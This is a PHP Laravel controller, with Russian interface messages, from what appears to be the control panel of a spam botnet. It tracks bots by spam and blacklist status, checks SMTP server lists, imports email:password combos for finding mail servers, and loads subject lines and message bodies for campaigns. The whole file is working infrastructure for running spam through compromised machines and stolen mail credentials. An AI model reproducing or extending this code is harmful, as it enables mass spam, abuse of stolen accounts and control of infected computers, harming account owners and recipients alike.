<?php

namespace App\Http\Controllers;

use App\Bots;
use App\Messages;
use App\PannelSettings;
use App\SettingsForCheckSMTP;
use App\smtpfindpiece;
use App\smtpfind;
use App\SMTP;
use App\SmtpListForCheck;
use App\smtplistpiece;
use App\Themes;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use narutimateum\Toastr\Facades\Toastr;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $data = [
            'themeInfo'         => Storage::has(config('config.theme')) ? "Файл " . config('config.theme') . " загружен" : "Файл " . config('config.theme') . " отсутствует",
            'messageInfo'       => Storage::has(config('config.message')) ? "Файл " . config('config.message') . " загружен" : "Файл " . config('config.message') . " отсутствует",
            'smtpCount'         => SMTP::count(),
            'mailsFileCount'    => count(Storage::files(config('config.emails.mails'))),
            'attachFileCount'   => count(Storage::files(config('config.attach'))),
            'go_mailsFileCount' => count(Storage::files(config('config.emails.go_mails'))),
        ];

        $settings       = PannelSettings::whereId(1)->first();
        $status         = $settings->status;
        $checkBlackList = $settings->checkBlackList;

        $bots                     = Bots::paginate(config('config.bot_paginate'));
        $botsInfo                 = [];
        $botsInfo['online']       = Bots::where(['life' => 1])->count();
        $botsInfo['off']          = Bots::where(['otk' => 1])->count();
        $botsInfo['spam']         = Bots::where(['bot_status' => 1, 'life' => 1])->count();
        $botsInfo['wait']         = Bots::where(['bot_status' => 2, 'life' => 1])->count();
        $botsInfo['clear_online'] = Bots::where(['life' => 1, 'black' => 0])->count();
        $botsInfo['black_online'] = Bots::where(['life' => 1, 'black' => 1])->count();

        $smtpInfo              = [];
        $smtpInfo['all']       = SmtpListForCheck::count();
        $smtpInfo['needCheck'] = SmtpListForCheck::where(['isget' => 0])->count();
        $smtpInfo['inCheck']   = SmtpListForCheck::where('time', '<>', '')->count();
        $smtpInfo['good']      = SmtpListForCheck::where(['status' => 'SENT'])->count();
        $smtpInfo['bad']       = SmtpListForCheck::where(['status' => 'BAD'])->count();

        $pool              = [];
        $pool['needCheck'] = smtplistpiece::where(['isget' => 0])->count();
        $pool['inCheck']   = smtplistpiece::where('time', '<>', '')->count();
        $pool['good']      = smtplistpiece::where(['status' => 'SENT'])->count();
        $pool['bad']       = smtplistpiece::where(['status' => 'BAD'])->count();

        $emailInfo              = [];
        $emailInfo['all']       = smtpfind::count();
        $emailInfo['needCheck'] = smtpfind::where(['isget' => 0])->count();
        $emailInfo['checked'] = smtpfind::where(['isget'=>1])->count();
        $emailInfo['good'] = smtpfind::where('status','not like','%none%')->count();
        $emailInfo['bad'] = smtpfind::where('status','like','%none%')->count();

        $Epool              = [];
        $Epool['needCheck'] = smtpfindpiece::where(['isget' => 0])->count();
        $Epool['inCheck'] = smtpfindpiece::where(['isget'=>1])->count(); 
        $Epool['good'] = smtpfindpiece::where('status','not like','none%')->count();
        $Epool['bad'] = smtpfindpiece::where('status','like','none%')->count();

        $data['themeCount']   = Themes::count();
        $data['messageCount'] = Messages::count();

        return view('home.index',
            compact('data', 'status', 'bots', 'checkBlackList', 'botsInfo', 'smtpInfo', 'pool','emailInfo','Epool'));
    }

    public function delete($name)
    {
        switch ($name) {
            case 'themefile' :
                Storage::delete(config('config.theme'));
                break;
            case 'messagefile' :
                Storage::delete(config('config.message'));
                break;
            case 'smtpclear' :
                DB::table('smtp')->truncate();
                break;
            case 'mailfilesclear':
                Storage::deleteDirectory(config('config.emails.mails'));
                Storage::makeDirectory(config('config.emails.mails'));
                break;
            case 'attachfilesclear':
                Storage::deleteDirectory(config('config.attach'));
                Storage::makeDirectory(config('config.attach'));
                break;
            case 'clearSmtpTable':
                DB::table('smtplistforcheck')->truncate();
                break;
            case 'clearEmailTable':
                DB::table('smtpfind')->truncate();
                break;
        }

        return redirect(url('/'));
    }

    public function uploadSmtp()
    {
        if (empty(config('config.smtpFolder'))) {
            Toastr::error("Ключь smtpFolder отсутствует в config.php", "", $options = []);

            return redirect(url('/'));
        }

        if ( ! Storage::has(config('config.smtpFolder'))) {
            Toastr::error("Отсутствует папка " . config('config.smtpFolder'), "", $options = []);
            if (Storage::makeDirectory(config('config.smtpFolder'))) {
                Toastr::success("Папка " . config('config.smtpFolder') . " создана");
            }

            return redirect(url('/'));
        }

        $array = [];
        DB::table('smtp')->truncate();

        foreach (Storage::files(config('config.smtpFolder')) as $file) {
            foreach (explode("\n", Storage::get($file)) as $line) {
                $array[] = ['domen' => $line];

                if (count($array) > 100) {
                    SMTP::insert($array);
                    $array = [];
                }
            }
        }

        return redirect(url('/'));
    }

    public function themes()
    {
        if (Storage::has(config('config.theme'))) {
            $themes = explode("\n", Storage::get(config('config.theme')));
            $now    = 1;
            DB::table('themes')->delete();
            foreach ($themes as $theme) {
                $array[] = ['thema' => $theme];
                if (count($array) > 100 || $now++ == count($themes)) {
                    Themes::insert($array);
                    $array = [];
                }
            }

            Toastr::success("Темы загружены");

            return redirect(url('/'));
        }

        Toastr::error("Что то пошло не так, возможно нету файла ".config('config.theme')." в storage/app");

        return redirect(url('/'));
    }

    public function messages()
    {
        if (Storage::has(config('config.message'))) {
            $themes = explode("\n", Storage::get(config('config.message')));
            $now    = 1;
            DB::table('messages')->delete();
            foreach ($themes as $theme) {
                $array[] = ['message' => $theme];
                if (count($array) > 100 || $now++ == count($themes)) {
                    Messages::insert($array);
                    $array = [];
                }
            }

            Toastr::success("Сообщения загружены");

            return redirect(url('/'));
        }
        Toastr::error("Что то пошло не так, возможно нету файла ".config('config.message')." в storage/app");

        return redirect(url('/'));
    }

    public function uploadEmailsForSmtpFind(){
        if (Storage::has(config('config.smtpfind'))) {
            $emails = explode("\n", Storage::get(config('config.smtpfind')));
            $now    = 1;
            DB::table('smtpfind')->delete();

            foreach ($emails as $email) {
                $array[] = ['emailpas' => trim($email)];
                if (count($array) > 100 || $now++ == count($emails)) {
                    smtpfind::insert($array);
                    $array = [];
                }
            }
            Toastr::success("Email загружены в количестве: ".count($emails));

            return redirect(url('/'));
        }

        Toastr::error("Что то пошло не так, возможно нету файла ".config('config.smtpfind')." в storage/app");

        return redirect(url('/'));
    }

}
